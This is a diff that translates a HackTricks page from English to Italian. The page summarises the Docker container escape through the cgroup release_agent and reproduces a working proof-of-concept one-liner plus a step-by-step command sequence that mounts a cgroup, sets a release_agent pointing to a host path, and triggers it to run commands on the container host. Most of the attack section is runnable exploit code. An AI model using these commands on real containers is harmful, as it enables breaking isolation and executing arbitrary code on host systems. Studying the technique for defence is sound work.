@@ -2,23 +2,22 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 
 
-**For further details, refer to the [original blog post](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** This is just a summary:
+**Per ulteriori dettagli, consulta il [post originale del blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/).** Questo è solo un riassunto:
 
-Original PoC:
-
+PoC originale:
 ```shell
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
@@ -26,62 +25,50 @@ t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
+Il proof of concept (PoC) dimostra un metodo per sfruttare i cgroups creando un file `release_agent` e innescando la sua invocazione per eseguire comandi arbitrari sull'host del contenitore. Ecco una panoramica dei passaggi coinvolti:
 
-The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:
-
-1. **Prepare the Environment:**
-   - A directory `/tmp/cgrp` is created to serve as a mount point for the cgroup.
-   - The RDMA cgroup controller is mounted to this directory. In case of absence of the RDMA controller, it's suggested to use the `memory` cgroup controller as an alternative.
-
+1. **Preparare l'Ambiente:**
+- Viene creato un directory `/tmp/cgrp` per fungere da punto di montaggio per il cgroup.
+- Il controller cgroup RDMA viene montato in questa directory. Nel caso in cui il controller RDMA sia assente, si consiglia di utilizzare il controller cgroup `memory` come alternativa.
 ```shell
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
-
-2. **Set Up the Child Cgroup:**
-    - A child cgroup named "x" is created within the mounted cgroup directory.
-    - Notifications are enabled for the "x" cgroup by writing 1 to its notify_on_release file.
-
+2. **Configurazione del sottogruppo figlio:**
+- Viene creato un sottogruppo figlio chiamato "x" all'interno della directory del sottogruppo montato.
+- Le notifiche vengono abilitate per il sottogruppo "x" scrivendo 1 nel suo file notify_on_release.
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
-
-3. **Configure the Release Agent:**
-    - The path of the container on the host is obtained from the /etc/mtab file.
-    - The release_agent file of the cgroup is then configured to execute a script named /cmd located at the acquired host path.
-
+3. **Configurare l'Agente di Rilascio:**
+- Il percorso del contenitore sull'host viene ottenuto dal file /etc/mtab.
+- Il file release_agent del cgroup viene quindi configurato per eseguire uno script chiamato /cmd situato nel percorso dell'host acquisito.
 ```shell
 host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-
-4. **Create and Configure the /cmd Script:**
-    - The /cmd script is created inside the container and is configured to execute ps aux, redirecting the output to a file named /output in the container. The full path of /output on the host is specified.
-
+4. **Creazione e configurazione dello script /cmd:**
+- Lo script /cmd viene creato all'interno del container e viene configurato per eseguire il comando ps aux, reindirizzando l'output su un file chiamato /output nel container. Viene specificato il percorso completo di /output sull'host.
 ```shell
 echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
-
-5. **Trigger the Attack:**
-    - A process is initiated within the "x" child cgroup and is immediately terminated.
-    - This triggers the `release_agent` (the /cmd script), which executes ps aux on the host and writes the output to /output within the container.
-
+5. **Innesca l'Attacco:**
+- Viene avviato un processo all'interno del sottogruppo "x" dei figli e viene immediatamente terminato.
+- Ciò attiva il `release_agent` (lo script /cmd), che esegue ps aux sull'host e scrive l'output su /output all'interno del contenitore.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
